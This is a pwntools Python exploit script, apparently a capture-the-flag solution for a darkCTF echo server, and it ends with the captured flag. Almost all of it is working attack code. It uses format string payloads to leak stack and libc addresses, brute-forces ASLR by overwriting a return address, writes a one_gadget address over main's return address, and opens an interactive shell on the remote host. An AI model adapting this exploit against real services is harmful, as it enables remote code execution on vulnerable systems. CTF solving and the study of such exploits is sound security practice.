"""
Use format string vulnerability to leak pointers and overwrite last byte of return 
address, allowing us to loop. On subsequent iterations, use our new knowledge of the
stack and libc to overwrite the return address of main with a one gadget

4 bits of ASLR on the return address overwrite, so 1/16
"""
from pwn import *

binary_path = "./server"
#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break fuck
break main
#break *0x555555554a13

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc echoserver.darkarmy.xyz 32768
        return remote("echoserver.darkarmy.xyz", 32768)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})

# Useful offsets: 
# 7 - Pointer to stack
# 9 - Pointer to pointer to stack
# 17 - main's return address


LIBC_OFFSET = 0x21b97
ONE_GADGET_OFFSET = 0x10a45c

def exploit(io):
    io.recvuntil("> ")
    
    prefix_length = 78
    
    fuck_return_addr = 0x88 # 4 bits of ASLR here

    # Cop out for GDB
    if args.GDB:
        fuck_return_addr = int(input("Return addr: "), 0)

    # Leak and re-rerun
    curr_len = prefix_length
    fuck_return_num = ((0xff - curr_len) + (fuck_return_addr & 0xff) + 1) & 0xff
    curr_len += fuck_return_num
    addr_overwrite_num = ((0xff - curr_len) + 0x5a + 1) & 0xff
    io.sendline(f"%p%p%p%p%p%p%p%{fuck_return_num}c%hhn%{addr_overwrite_num}c%7$hhn.%9$p.%17$p.A\0")
    io.recvuntil("> ")
    
    # Parse out info from the mess that just got output
    leak = io.recvuntil(".")
    leak = io.clean(timeout=0.5).split(b".") 
    output = leak[-1]
    libc_leak = int(leak[-2], 0)
    stack_leak = int(leak[-3], 0)
    
    libc.address = libc_leak - LIBC_OFFSET
    
    one_gadget_addr = libc.address + ONE_GADGET_OFFSET
    
    print(output)
    print(f"LIBC: {hex(libc_leak)}")
    print(f"ONE GADGET: {hex(one_gadget_addr)}")
    print(f"STACK: {hex(stack_leak)}")
   
    # If everything worked, then we're back in the fuck() function, so we should have
    # another prompt. If we don't, we guessed wrong on the ASLR
    if b">" not in output:
        print("*** ASLR WRONG ***")
        raise Error("BAD ASLR")
  

    # This function sets the "where" of a write-what-where primitive. Overwrites the
    # lower 16 bits of a stack pointer so it will point to an almost arbitrary stack
    # location.
    def write_target(target, size_mask=0xffff):
        curr_len = prefix_length + fuck_return_num + 120
        target_overwrite_num = ((size_mask - curr_len) + (target & size_mask) + 1) & size_mask
        curr_len += target_overwrite_num
        ret_addr_overwrite_num = ((0xff - curr_len) + 0x5a + 1) & 0xff
        io.sendline(f"%p%p%p%p%p%p%p%{fuck_return_num}c%hhn" + "%p"*8 + f"%{target_overwrite_num}c"  + "%hn" + f"%{ret_addr_overwrite_num}c%7$hhn\0")
        io.recvuntil("> ")
        io.recvuntil("> ")


    # Writes data to the location set by write_taget(). Fairly standard format string
    def write_to_target(data, offset = 0):
        curr_len = prefix_length + fuck_return_num + offset
        data_num = ((0xffff - curr_len) + (data) + 1) & 0xffff
        curr_len += data_num
        ret_addr_overwrite_num = ((0xff - curr_len) + 0x5a + 1) & 0xff
        io.sendline(f"%p%p%p%p%p%p%p%{fuck_return_num}c%hhn" + f"%{data_num}c%45$hn" + f"%{ret_addr_overwrite_num}c%7$hhn\0")
        io.recvuntil("> ")
        io.recvuntil("> ")

    # Address of the main function's return address (returns to libc, hence the name)
    libc_ret_stack_addr = stack_leak + 0x50
   
    # We have to write a short at a time.
    print("Write Lower Target")
    write_target(libc_ret_stack_addr)
    print("Write Lower Data")
    write_to_target(one_gadget_addr & 0xffff)
 
    print("Write Upper target")
    write_target(libc_ret_stack_addr + 0x02)
    print("Write Upper Data")
    write_to_target((one_gadget_addr >> 16) & 0xffff, offset=0)
   
    # Final write_to_target spits us back into the fuck function, so a final line returns
    # through main, into our one gadget, giving us a shell
    io.sendline("can has shell plz?")
    io.interactive()


if args.GDB:
    io = start()
    exploit(io)
else:
    running = True
    while running:
        io = start()
        try:
            print("*** STARTING EXPLOIT ***")
            exploit(io)
            running = False
        except (KeyboardInterrupt, SystemExit):
            print("*** GOODBYE ***")
            running = False
            raise
        except:
            print("*** ASLR WRONG ***")
            if io.connected():
                io.close()

# darkCTF{https://www.youtube.com/watch?v=7H9AaiBLHCo........b2da1e4cf4d03918be2bdc56ae1d4ec2}
